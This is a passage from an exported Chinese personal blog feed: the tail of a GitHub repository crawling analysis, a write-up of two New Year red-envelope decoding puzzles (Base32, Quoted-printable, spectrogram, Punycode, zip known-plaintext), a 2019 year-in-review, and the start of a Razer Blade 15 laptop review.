回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 